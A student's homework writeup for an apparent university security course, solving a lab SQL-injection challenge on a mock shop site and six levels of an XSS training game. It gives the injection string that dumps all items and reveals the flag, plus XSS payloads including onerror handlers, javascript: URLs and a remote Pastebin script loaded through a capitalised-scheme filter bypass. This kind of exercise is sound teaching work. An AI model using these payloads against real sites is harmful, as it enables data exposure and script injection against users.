# Crypto II Writeup

Name: Akshay Anil
Section: 0201

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Akshay Anil

## Assignment Writeup

### Part 1 (40 Pts)
Clicking on the items in the shop, I noticed that the url ended in a `?` followed by a key value pair. This was exploitable by replacing the `id=0` with `id='||'1'='1` in 1337bank.money:5000/item?id=0. The replacement closes the input field and then sends `true`. This allows us to view all items in the shop together in one page, including the flag `CMSC389R-{y0u_ar3_th3_SQ1_ninj@}` costing $1337.

### Part 2 (60 Pts)
+ **Level 1** requires an alert to be shown via user input. Entering the javascript code `<script>alert()</script>` in the search box allows us to proceed.
+ The same input as Level 1 did not work for **Level 2**. Here, I used a button to initiate the alert with `<button onclick="alert()">Click me</button>`.
+ **Level 3** can be passed be forced into an error by replacing the frame number with a string. We can use this error to display the alert by appending `onerror='alert()'` afterwards.
+ **Level 4** already has an alert that pops up at a user specified amount of time. We can close the alert and and push our own with `'); alert('`.
+ **Level 5** sets `next` to `confirm` in the URL when the Sign up button is pressed. If we change confirm to `javascript:alert();`, we can move on to Level 6.
+ For **Level 6**, we can see that a javascript file is loaded by looking at the end of the URL. We can exploit this by linking to an alert script online. To do this, I created a paste with Pastebin with just `alert()`. Simply replacing the script location with the paste URL was not enough because http was blocked. I circumvented this by capitalizing https. In the end, the URL was https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw.php?i=rC4c1ECv
